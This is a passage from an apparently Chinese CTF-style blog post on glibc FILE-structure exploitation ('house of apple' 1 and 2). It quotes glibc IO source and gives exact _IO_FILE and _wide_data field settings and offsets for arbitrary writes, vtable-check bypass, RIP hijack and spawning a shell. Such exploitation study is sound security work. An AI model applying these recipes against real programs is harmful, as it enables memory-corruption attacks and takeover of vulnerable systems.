class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 赋值为old_buf</span></span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 这里任意地址分配</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 劫持_IO_buf_base后即可任意地址写任意值</span></span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">// .......</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>利用步骤如下：</p><ul><li>伪造至少两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tcache</code>全局变量为已知值，也就控制了<code>tcache bin</code>的分配</li><li>第二个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_str_overflow</code>中的<code>malloc</code>函数任意地址分配，并使用<code>memcpy</code>使得能够<strong>任意地址写任意值</strong></li><li>利用两次任意地址写任意值修改<code>pointer_guard</code>和<code>IO_accept_foreign_vtables</code>的值绕过<code>_IO_vtable_check</code>函数的检测（或者利用一次任意地址写任意值修改<code>libc.got</code>里面的函数地址，很多<code>IO</code>流函数调用<code>strlen/strcpy/memcpy/memset</code>等都会调到<code>libc.got</code>里面的函数）</li><li>利用一个<code>_IO_FILE</code>，随意伪造<code>vtable</code>劫持程序控制流即可</li></ul><p>因为可以已经任意地址写任意值了，所以这可以控制的变量和结构体非常多，也非常地灵活，需要结合具体的题目进行利用，比如题目中<code>_IO_xxx_jumps</code>映射的地址空间可写的话直接修改其函数指针即可。</p><h3 id="思路二：修改mp-结构体"><a href="#思路二：修改mp-结构体" class="headerlink" title="思路二：修改mp_结构体"></a>思路二：修改<code>mp_</code>结构体</h3><p>该思路与上述思路差不多，不过对<code>tcachebin</code>分配的劫持是通过修改<code>mp_.tcache_bins</code>这个变量。打这个结构体的好处是在攻击远程时不需要爆破地址，因为<strong>线程全局变量、<code>tls</code>结构体的地址本地和远程并不一定是一样的，有时需要爆破。</strong></p><p>利用步骤如下：</p><ul><li>伪造至少两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>mp_.tcache_bins</code>为很大的值，使得很大的<code>chunk</code>也通过<code>tcachebin</code>去管理</li><li>接下来的过程与上面的思路是一样的</li></ul><h3 id="思路三：修改pointer-guard线程变量之house-of-emma"><a href="#思路三：修改pointer-guard线程变量之house-of-emma" class="headerlink" title="思路三：修改pointer_guard线程变量之house of emma"></a>思路三：修改<code>pointer_guard</code>线程变量之<code>house of emma</code></h3><p>该思路其实就是<code>house of apple + house of emma</code>。</p><p>利用步骤如下：</p><ul><li>伪造两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tls</code>结构体<code>pointer_guard</code>的值为已知值</li><li>第二个<code>_IO_FILE</code>结构体用来做<code>house of emma</code>利用即可控制程序执行流</li></ul><h3 id="思路四：修改global-max-fast全局变量"><a href="#思路四：修改global-max-fast全局变量" class="headerlink" title="思路四：修改global_max_fast全局变量"></a>思路四：修改<code>global_max_fast</code>全局变量</h3><p>这个思路也很灵活，修改掉这个变量后，直接释放超大的<code>chunk</code>，去覆盖掉<code>point_guard</code>或者<code>tcache</code>变量。我称之为<code>house of apple + house of corrision</code>。</p><p>利用过程与前面也基本是大同小异，就不在此详述了。</p><hr><p>其实也有其他的思路，比如还可以劫持<code>main_arena</code>，不过这个结构体利用起来会更复杂，所需要的空间将更大。而在上述思路的利用过程中，可以选择错位构造<code>_IO_FILE</code>结构体，只需要保证关键字段满足要求即可，这样可以更加节省空间。</p><h2 id="例题-7"><a href="#例题-7" class="headerlink" title="例题"></a>例题</h2><h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h1><h2 id="概要-15"><a href="#概要-15" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>在house of apple1的基础上,在只劫持<code>_wide_data</code>的条件下控制程序的执行流,<code>house of apple2</code>会提出几条新的<code>IO</code>利用链，在劫持<code>_IO_FILE-&gt;_wide_data</code>的基础上，直接控制程序执行流.</p><p><strong>利用条件:</strong></p><ol><li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li><li>能够泄露堆地址和libc基址</li><li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>除了与_IO_wstrn_jumps有关的有效版本为2.36及以前,<strong>其他为ALL版本有效</strong></p><h2 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h2><p><code>stdin/stdout/stderr</code>这三个<code>_IO_FILE</code>结构体使用的是<code>_IO_file_jumps</code>这个<code>vtable</code>，而当需要调用到<code>vtable</code>里面的函数指针时，会使用宏去调用。以<code>_IO_file_overflow</code>调用为例，<code>glibc</code>中调用的代码片段分析如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure><p>其中，<code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</p><p>观察<code>struct _IO_wide_data</code>结构体，发现其对应有一个<code>_wide_vtable</code>成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，仍然以<code>vtable-&gt;_overflow</code>调用为例，所用到的宏依次为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><p>可以看到，在调用<code>_wide_vtable</code>里面的成员函数指针时，<strong>没有关于vtable的合法性检查</strong>。</p><p>因此，我们可以劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>目前在<code>glibc</code>源码中搜索到的<code>_IO_WXXXXX</code>系列函数的调用只有<code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>和<code>_IO_WOVERFLOW</code>。<br>其中<code>_IO_WSETBUF</code>和<code>_IO_WUNDERFLOW</code>目前无法利用或利用困难，其余的均可构造合适的<code>_IO_FILE</code>进行利用。这里给出我总结的几条比较好利用的链。以下使用<code>fp</code>指代<code>_IO_FILE</code>结构体变量。</p><h3 id="利用-IO-wfile-overflow函数控制程序执行流"><a href="#利用-IO-wfile-overflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow函数控制程序执行流"></a>利用_IO_wfile_overflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</li><li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>首先看<code>_IO_wfile_overflow</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wdoallocbuf (f);<span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p><p>然后看<code>_IO_wdoallocbuf</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="comment">// _IO_WXXXX调用</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p>需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p><h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p><h3 id="利用-IO-wdefault-xsgetn函数控制程序执行流"><a href="#利用-IO-wdefault-xsgetn函数控制程序执行流" class="headerlink" title="利用_IO_wdefault_xsgetn函数控制程序执行流"></a>利用_IO_wdefault_xsgetn函数控制程序执行流</h3><p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong>。如果不满足这个条件，可选用其他链。</p><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>0x800</code></li><li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li><li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>首先看<code>_IO_wdefault_xsgetn</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">          <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">          <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        *s++ = *p++;</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure><p>由于<code>more</code>是第三个参数，所以不能为<code>0</code>。<br>直接设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。<br>随后当<code>more != 0</code>时会进入<code>__wunderflow</code>。</p><p>接着看<code>__wunderflow</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span 